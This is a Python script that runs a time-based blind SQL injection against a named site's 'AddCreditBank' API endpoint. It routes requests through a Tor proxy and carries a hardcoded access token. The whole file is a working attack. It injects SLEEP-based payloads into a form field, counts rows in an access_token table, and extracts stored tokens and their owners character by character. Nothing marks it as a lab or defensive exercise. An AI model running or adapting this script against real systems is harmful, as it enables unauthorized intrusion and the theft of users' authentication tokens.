#!/usr/bin/env python3
"""Time-blind SQLi token extractor for cybermagic555.com"""
import requests
import time
import string
import sys

PROXY = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
URL = "https://cybermagic555.com/api/AddCreditBank"
TOKEN = "gscAVZpq7eQeGqAprWEk4M7RX"
DELAY = 2
THRESHOLD = 3.5

CHARSET = string.ascii_letters + string.digits + "_-+=/."

def check_condition(condition: str) -> bool:
    payload = f"1' AND IF({condition},SLEEP({DELAY}),0)-- -"
    files = {
        "BankLogID": (None, payload),
        "AccessToken": (None, TOKEN)
    }
    start = time.time()
    try:
        requests.post(URL, files=files, proxies=PROXY, timeout=30)
    except:
        pass
    elapsed = time.time() - start
    return elapsed > THRESHOLD

def extract_string(query: str, max_len: int = 50) -> str:
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for c in CHARSET:
            cond = f"SUBSTRING(({query}),{pos},1)='{c}'"
            if check_condition(cond):
                result += c
                print(f"\r[+] Extracted: {result}", end="", flush=True)
                found = True
                break
        if not found:
            break
    print()
    return result

def count_rows(table: str) -> int:
    for n in [1, 5, 10, 20, 50, 100]:
        if not check_condition(f"(SELECT COUNT(*) FROM {table})>{n}"):
            return n
    return 100

if __name__ == "__main__":
    print("[*] Time-blind SQLi extractor for cybermagic555.com")
    print("[*] Target table: access_token")

    # Count rows
    print("[*] Counting tokens...")
    for n in range(1, 15):
        if check_condition(f"(SELECT COUNT(*) FROM access_token)={n}"):
            print(f"[+] Found {n} tokens")
            break

    # Extract each token
    for i in range(10):
        print(f"\n[*] Extracting token {i}...")
        token = extract_string(f"SELECT Token FROM access_token LIMIT {i},1", 30)
        if not token:
            print(f"[!] No more tokens at position {i}")
            break
        print(f"[+] Token {i}: {token}")

        # Also get associated user/owner info if available
        owner = extract_string(f"SELECT Owner FROM access_token LIMIT {i},1", 30)
        if owner:
            print(f"    Owner: {owner}")
